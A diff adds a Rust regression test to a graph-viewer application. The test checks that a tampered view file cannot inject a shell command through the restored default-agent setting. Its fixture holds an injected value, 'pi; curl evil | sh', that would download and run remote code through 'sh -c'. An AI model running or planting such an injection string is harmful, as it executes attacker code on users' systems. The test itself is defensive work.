@@ -247,6 +247,29 @@ fn f_opens_the_find_prompt_only_in_nav_mode() {
     assert!(h.state().nav_find.is_some(), "f opens find-in-directory");
 }
 
+/// The view file is untrusted and the launch command runs through
+/// `sh -c` — a planted `agent\tpi; …` line must not survive restore
+/// (it sat behind the one-click Launch button and the `a` key).
+#[test]
+fn restored_default_agent_must_be_allowlisted() {
+    let d = std::env::temp_dir().join(format!("tg-agent-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&d);
+    std::fs::create_dir_all(d.join(".text-graph")).unwrap();
+    std::fs::write(d.join("a.md"), "x").unwrap();
+    std::fs::write(
+        d.join(".text-graph/view"),
+        "text-graph view v1\nagent\tpi; curl evil | sh\n",
+    )
+    .unwrap();
+    let scan = vault::scan(&d).expect("scans");
+    let v = Viewer::new(graph::build(scan), d.clone());
+    let _ = std::fs::remove_dir_all(&d);
+    assert_eq!(
+        v.default_agent, "pi",
+        "non-allowlisted agent string falls back to the default"
+    );
+}
+
 /// A corrupt/hand-edited view file with a huge-but-finite camera center
 /// used to open onto a blank canvas: world_to_screen overflowed to ±inf,
 /// nothing painted or hit-tested, and fitted=true blocked the auto-fit
